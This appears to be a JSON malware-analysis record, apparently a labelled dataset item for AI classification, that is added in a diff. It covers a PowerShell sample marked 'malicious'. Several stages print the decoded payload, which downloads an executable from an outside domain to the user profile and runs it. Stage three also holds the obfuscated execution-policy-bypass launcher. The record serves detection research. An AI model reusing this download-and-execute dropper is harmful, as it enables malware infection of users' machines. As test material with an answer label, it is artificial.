@@ -1,0 +1,63 @@
+{
+  "meta": {
+    "quelldatei": "0ab753de218dbbe2abedb69a406fc07cd30b9e607632cfaba4e398f70c49c457.ps1",
+    "sha256": "0ab753de218dbbe2abedb69a406fc07cd30b9e607632cfaba4e398f70c49c457",
+    "groesse_bytes": 921,
+    "zeilen": 1,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 828,
+        "dekodiert": "[NeT.SeRViCepoIntMaNAgeR]::secUrITypRotoCOL = [NEt.seCuriTYPrOTocoLtyPE]::Tls12  ;  \tIRM \t-urI  (”http://o” \t \t+ \t”zzyingilizce.com/w” \t \t+ \t”p-co” \t \t+ \t”ntent/sgu/35465486743108” \t \t+ \t”29” \t \t+ \t”.” \t \t+ \t”e” \t \t+ \t”xe” \t) \t-ouTFile ”$env:userprOfIle\\updat.exe”  ; InvokE-IteM \t”$EnV:uSERpROFile\\updat.exe”"
+      }
+    ],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 828,
+        "dekodiert": "[NeT.SeRViCepoIntMaNAgeR]::secUrITypRotoCOL = [NEt.seCuriTYPrOTocoLtyPE]::Tls12  ;  \tIRM \t-urI  (”http://o” \t \t+ \t”zzyingilizce.com/w” \t \t+ \t”p-co” \t \t+ \t”ntent/sgu/35465486743108” \t \t+ \t”29” \t \t+ \t”.” \t \t+ \t”e” \t \t+ \t”xe” \t) \t-ouTFile ”$env:userprOfIle\\updat.exe”  ; InvokE-IteM \t”$EnV:uSERpROFile\\updat.exe”"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 828,
+        "dekodiert": "[NeT.SeRViCepoIntMaNAgeR]::secUrITypRotoCOL = [NEt.seCuriTYPrOTocoLtyPE]::Tls12  ;  \tIRM \t-urI  (”http://o” \t \t+ \t”zzyingilizce.com/w” \t \t+ \t”p-co” \t \t+ \t”ntent/sgu/35465486743108” \t \t+ \t”29” \t \t+ \t”.” \t \t+ \t”e” \t \t+ \t”xe” \t) \t-ouTFile ”$env:userprOfIle\\updat.exe”  ; InvokE-IteM \t”$EnV:uSERpROFile\\updat.exe”"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": " set-EXeCuTIonPOLICy BYPASs -scope PrOCesS -FoRcE ; PoWErshEll \t-eX ByPAsS -nOP \t-W 1 \t-Ec IABbAE4AZQBUAC4AUwBlAFIAVgBpAEMAZQBwAG8ASQBuAHQATQBhAE4AQQBnAGUAUgBdADoAOgBzAGUAYwBVAHIASQBUAHkAcABSAG8AdABvAEMATwBMACAAPQAgAFsATgBFAHQALgBzAGUAQwB1AHIAaQBUAFkAUAByAE8AVABvAGMAbwBMAHQAeQBQAEUAXQA6ADoAVABsAHMAMQAyACAAIAA7ACAAIAAJAEkAUgBNACAACQAtAHUAcgBJACAAIAAoAB0gaAB0AHQAcAA6AC8ALwBvAB0gIAAJACAACQArACAACQAdIHoAegB5AGkAbgBnAGkAbABpAHoAYwBlAC4AYwBvAG0ALwB3AB0gIAAJACAACQArACAACQAdIHAALQBjAG8AHSAgAAkAIAAJACsAIAAJAB0gbgB0AGUAbgB0AC8AcwBnAHUALwAzADUANAA2ADUANAA4ADYANwA0ADMAMQAwADgAHSAgAAkAIAAJACsAIAAJAB0gMgA5AB0gIAAJACAACQArACAACQAdIC4AHSAgAAkAIAAJACsAIAAJAB0gZQAdICAACQAgAAkAKwAgAAkAHSB4AGUAHSAgAAkAKQAgAAkALQBvAHUAVABGAGkAbABlACAAHSAkAGUAbgB2ADoAdQBzAGUAcgBwAHIATwBmAEkAbABlAFwAdQBwAGQAYQB0AC4AZQB4AGUAHSAgACAAOwAgAEkAbgB2AG8AawBFAC0ASQB0AGUATQAgAAkAHSAkAEUAbgBWADoAdQBTAEUAUgBwAFIATwBGAGkAbABlAFwAdQBwAGQAYQB0AC4AZQB4AGUAHSA= \t",
+    "dekodierte_befehle": [
+      "[NeT.SeRViCepoIntMaNAgeR]::secUrITypRotoCOL = [NEt.seCuriTYPrOTocoLtyPE]::Tls12  ;  \tIRM \t-urI  (”http://o” \t \t+ \t”zzyingilizce.com/w” \t \t+ \t”p-co” \t \t+ \t”ntent/sgu/35465486743108” \t \t+ \t”29” \t \t+ \t”.” \t \t+ \t”e” \t \t+ \t”xe” \t) \t-ouTFile ”$env:userprOfIle\\updat.exe”  ; InvokE-IteM \t”$EnV:uSERpROFile\\updat.exe”"
+    ],
+    "beobachtete_abfolge": []
+  }
+}
